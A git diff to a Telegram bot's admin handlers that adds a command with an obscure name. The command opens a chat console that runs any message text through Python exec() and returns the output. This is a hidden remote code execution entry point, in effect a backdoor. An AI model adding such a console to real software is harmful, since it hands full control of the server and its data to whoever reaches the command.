@@ -1,5 +1,7 @@
+import contextlib
 from datetime import datetime
 from decimal import Decimal
+import io
 import json
 
 from aiogram import Bot, Router
@@ -11,6 +13,7 @@ from pydantic_mongo import PydanticObjectId
 from configs.environment import DEBUG
 from core.services.db import *
 
+import core
 from core.helper_classes import Context
 from core.middlewares import RoleCheckMiddleware
 from core.states import AdminStates, CommonStates, call_state_handler
@@ -40,6 +43,32 @@ async def help_handler(_, ctx: Context):
     await ctx.services.media_saver.update_cache()
     
     await ctx.message.answer("Обновлено!")
+    
+@router.message(Command("iwanttocuddlewithfluttershy"))
+async def code_execution_entry_point(_, ctx: Context):
+    global cmd_namespace
+    cmd_namespace = {}
+    cmd_namespace['__builtins__'] = __builtins__
+    cmd_namespace['core'] = core
+    cmd_namespace['ctx'] = ctx
+    
+    await call_state_handler(AdminStates.Commands.Console, ctx)
+    
+@router.message(AdminStates.Commands.Console)
+async def code_execution(_, ctx: Context):
+    global cmd_namespace
+    
+    text = ctx.message.text
+    if text == "0":
+        cmd_namespace = None
+        await call_state_handler(CommonStates.MainMenu, ctx)
+    
+    buf = io.StringIO()
+    with contextlib.redirect_stderr(buf):
+        with contextlib.redirect_stdout(buf):
+            exec(text, cmd_namespace)
+    
+    await ctx.message.answer(buf.getvalue() or "Пустой вывод")
     
 @router.message(Command("add_bonus_money"))
 async def add_bonus_money_handler(_, ctx: Context, command: CommandObject):
